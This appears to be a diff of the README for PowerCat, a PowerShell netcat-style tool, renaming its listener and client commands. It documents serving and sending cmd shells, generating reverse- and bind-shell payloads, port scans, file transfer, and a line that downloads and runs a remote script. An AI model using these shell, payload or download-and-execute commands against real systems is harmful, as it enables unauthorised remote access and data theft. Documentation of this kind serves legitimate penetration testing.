@@ -11,7 +11,7 @@ Installation
 PowerCat is a PowerShell module.  First you need to import the module before you can use the PowerCat functions.  You can put one of the below commands into your PowerShell profile so PowerCat is automatically loaded when PowerShell starts.
 ###
 ```powershell
-    # Import the functions from downloaded .psm1 File:
+    # Import the functions from downloaded psm1/psd1 File:
     Import-Module PowerCat.psm1
     # Load the functions individually from URL:
     Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/secabstraction/PowerCat/master/Invoke-PowerCat.ps1')
@@ -19,24 +19,34 @@ PowerCat is a PowerShell module.  First you need to import the module before you
 ```
 ### Parameters:
 ```powershell    
-    New-PowerCat
+    Start-PowerCat # Listener
     
-    -Listener       # Listen for a connection.                            [Switch]
-    -Client         # IPv4 address of a listener to connect to.           [String]
-    -Relay          # Format: "<Mode>:10.1.1.1:443"                       [String]
-    
-    -Mode           # Defaults to Tcp, can also specify Udp, Icmp         [String]
-    -Port           # The port to connect to or listen on.                [Int]
-    -Execute        # Execute a process.                                  [String]
-    -PowerShell     # Execute Powershell.                                 [Switch]
-    -Timeout        # Timeout option. Default: 60                         [Int]
-    -Input          # Filepath (string), byte array, or string.           [Object]
-    -OutputType     # Console Output Type: "Host", "Bytes", or "String"   [String]
-    -OutputFile     # Output File Path.                                   [String]
+    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
+    -Port           # The port to listen on.                              [Int]
+	-PipeName       # Name of pipe to listen on.                          [String]
+	
+    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
+    -Execute        # Execute a console process or powershell.            [Switch]
+    -SendFile       # Filepath of file to send.                           [String]
+    -ReceiveFile    # Filepath of file to be written.                     [String]
     -Disconnect     # Disconnect after connecting.                        [Switch]
-    -Repeat         # Restart after disconnecting.                        [Switch]
-    -Payload        # Generate payload.                                   [Switch]
-    -Encoded        # Base64 encode payload.                              [Switch]
+    -KeepAlive      # Restart after disconnecting.                        [Switch]
+    -Timeout        # Timeout option. Default: 60                         [Int]
+	
+	Connect-PowerCat # Client
+	
+    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
+	-RemoteIp       # IPv4 address of host to connect to.                 [String]
+    -Port           # The port to connect to.                             [Int]
+	-PipeName       # Name of pipe to connect to.                         [String]
+	
+    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
+    -Execute        # Execute a console process or powershell.            [Switch]
+    -SendFile       # Filepath of file to send.                           [String]
+    -ReceiveFile    # Filepath of file to be written.                     [String]
+    -Disconnect     # Disconnect after connecting.                        [Switch]
+    -KeepAlive      # Restart after disconnecting.                        [Switch]
+    -Timeout        # Timeout option. Default: 60                         [Int]
 ```
 Basic Connections
 -----------------------------------
@@ -44,66 +54,57 @@ By default, PowerCat reads input from the console and writes input to the consol
 ###
 ```powershell
     # Basic Listener:
-    New-PowerCat -Listener -Port 443
+    Start-PowerCat -Port 443
         
     # Basic Client:
-    New-PowerCat -Client 10.1.1.1 -Port 443
-        
-    # Basic Client, Output as Bytes:
-    New-PowerCat -Client 10.1.1.1 -Port 443 -OutputType Bytes
+    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443
 ```
 File Transfer
 -------------
-PowerCat can be used to transfer files using the -Input and -OutputFile parameters.
+PowerCat can be used to transfer files using the -SendFile and -ReceiveFile parameters.
 ###
 ```powershell
     # Send File:
-    New-PowerCat -Client 10.1.1.1 -Port 443 -Input C:\pathto\inputfile
+    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\pathto\inputfile
         
     # Recieve File:
-    New-PowerCat -Listener -Port 443 -OutputFile C:\pathto\outputfile
+    Start-PowerCat -Port 443 -ReceiveFile C:\pathto\outputfile
 ```
 Shells
 ------
-PowerCat can be used to send and serve shells. Specify an executable to -Execute, or use -PowerShell to execute powershell.
+PowerCat can be used to send and serve shells using the -Execute parameter.
 ###
 ```powershell
-    # Serve a cmd Shell:
-    New-PowerCat -Listener -Port 443 -Execute cmd
+    # Serve a shell:
+    Start-PowerCat -Port 443 -Execute
         
     # Send a cmd Shell:
-    New-PowerCat -Client 10.1.1.1 -Port 443 -Execute cmd
-        
-    # Serve a shell which executes powershell commands:
-    New-PowerCat -Listener -Port 443 -PowerShell
+    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute
 ```
-UDP, SMB, and ICMP
+UDP and SMB
 -----------
 PowerCat supports more than sending data over TCP. 
 ###
 ```powershell
     # Send Data Over UDP:
-    New-PowerCat -Listener -Port 8000 -Mode Udp
+    Start-PowerCat -Mode Udp -Port 8000
         
     # Send Data Over SMB:
-    New-PowerCat -Listener -Mode Smb -PipeName PowerCat
-    
-    # Send Data Over ICMP:
-    New-PowerCat -Listener -Mode Icmp
+    Start-PowerCat -Mode Smb -PipeName PowerCat
 ```
 Relays
 ------
 Relays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
 ###
 ```powershell
-    # TCP Listener to TCP Client Relay:
-    New-PowerCat -Listener -Port 8000 -Relay tcp:10.1.1.16:443
+    # UDP Listener to TCP Client Relay:
+    Start-PowerCat -Mode Udp -Port 8000 -Relay tcp:10.1.1.16:443
         
     # TCP Listener to UDP Client Relay:
-    New-PowerCat -Listener -Port 8000 -Relay udp:10.1.1.16:53
+    Start-PowerCat -Port 8000 -Relay udp:10.1.1.16:53
         
     # TCP Client to Client Relay
-    New-PowerCat -Client 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
+    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
         
     # TCP Listener to Listener Relay
     New-PowerCat -Listener -Port 8000 -Relay tcp:9000
@@ -114,10 +115,10 @@ Payloads can be generated using New-PowerCatPayload.
 ###
 ```powershell
     # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
-    New-PowerCatPayload -Client 10.1.1.15 -Port 443 -Execute cmd 
+    New-PowerCatPayload -Client -RemoteIp 10.1.1.15 -Port 443 -Execute 
         
     # Generate a bind tcp encoded command which listens on port 8000:
-    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute cmd
+    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute
 ```
 Misc Usage
 ----------
@@ -125,11 +126,11 @@ PowerCat can also be used to perform port-scans, and start persistent listeners.
 ###
 ```powershell
     # Basic TCP port scan:
-    1..1024 | ForEach-Object { New-PowerCat -Client 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
+    1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
     
     # Basic UDP port scan:
-    1..1024 | ForEach-Object { New-PowerCat -Mode Udp -Client 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
+    1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
         
     # Persistent listener:
-    New-PowerCat -Listener -Port 443 -Input C:\pathto\inputfile -Repeat
+    Start-PowerCat -Port 443 -SendFile C:\pathto\inputfile -KeepAlive
 ```
